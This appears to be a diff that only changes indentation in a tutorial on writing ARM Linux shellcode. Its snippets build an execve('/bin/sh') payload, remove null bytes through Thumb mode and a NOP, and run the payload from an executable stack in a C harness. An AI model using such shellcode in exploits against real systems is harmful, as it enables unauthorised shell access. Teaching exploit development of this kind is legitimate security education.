@@ -13,11 +13,11 @@ Using the shell.s example from Part 1
     .global _start
 
     _start:
-            add r0, pc, #12
-            mov r1, #0
-            mov r2, #0
-            mov r7, #11
-            svc #1
+        add r0, pc, #12
+        mov r1, #0
+        mov r2, #0
+        mov r7, #11
+        svc #1
 
     _string:
     .asciz  "/bin/sh"
@@ -93,11 +93,11 @@ So now are assembly **shell.s** looks like this
     .global _start
 
     _start:
-            add r0, pc, #12
-            eor r1, r1, r1
-            eor r2, r2, r2
-            mov r7, #11
-            svc #1
+        add r0, pc, #12
+        eor r1, r1, r1
+        eor r2, r2, r2
+        mov r7, #11
+        svc #1
 
     _string:
     .asciz  "/bin/sh"
@@ -171,16 +171,16 @@ This is done with the **.code 16** or **.thumb** directive. By default we start 
     .global _start
 
     _start:
-            add r1, pc, #1
-            bx r1
+        add r1, pc, #1
+        bx r1
 
     .code 16
-            add r0, pc, #12
-            eor r1, r1, r1
-            eor r2, r2, r2
-            mov r7, #11
-            svc #1
-            nop
+        add r0, pc, #12
+        eor r1, r1, r1
+        eor r2, r2, r2
+        mov r7, #11
+        svc #1
+        nop
 
     _string:
     .asciz  "/bin/sh"
@@ -239,15 +239,15 @@ So try that
     .global _start
 
     _start:
-            add r1, pc, #1
-            bx r1
+        add r1, pc, #1
+        bx r1
 
     .code 16
-            add r0, pc, #6
-            eor r1, r1, r1
-            eor r2, r2, r2
-            mov r7, #11
-            svc #1
+        add r0, pc, #6
+        eor r1, r1, r1
+        eor r2, r2, r2
+        mov r7, #11
+        svc #1
 
     _string:
     .asciz  "/bin/sh"
@@ -281,16 +281,16 @@ What we can do is add an instruction that does nothing, a **NOP**, to push the s
 	.global _start
 
 	_start:
-			add r1, pc, #1
-			bx r1
+		add r1, pc, #1
+		bx r1
 
 	.code 16
-			add r0, pc, #8
-			eor r1, r1, r1
-			eor r2, r2, r2
-			mov r7, #11
-			svc #1
-			nop
+		add r0, pc, #8
+		eor r1, r1, r1
+		eor r2, r2, r2
+		mov r7, #11
+		svc #1
+		nop
 
 	_string:
 	.asciz  "/bin/sh"
@@ -362,16 +362,16 @@ Our code now looks like this
 	.global _start
 
 	_start:
-			add r1, pc, #1
-			bx r1
+		add r1, pc, #1
+		bx r1
 
 	.code 16
-			add r0, pc, #8
-			eor r1, r1, r1
-			eor r2, r2, r2
-			mov r7, #11
-			strb r1, [r0, #7]
-			svc #1
+		add r0, pc, #8
+		eor r1, r1, r1
+		eor r2, r2, r2
+		mov r7, #11
+		strb r1, [r0, #7]
+		svc #1
 
 	_string:
 	.ascii  "/bin/shA"
@@ -474,15 +474,15 @@ And now we can try running our code from the stack of a normal program
 
 	int main(int argc, char **argv)
 	{
-			char buff[40];
+		char buff[40];
 
-			strcpy(buff, shellcode);
+		strcpy(buff, shellcode);
 
-			printf("Length: %d\n", strlen(buff));
+		printf("Length: %d\n", strlen(buff));
 
-			(*(void(*)()) buff)();
+		(*(void(*)()) buff)();
 
-			return 0;
+		return 0;
 	}
 
 When building we need to tell the linker to allow an executable stack [execstack(8)][execstack]
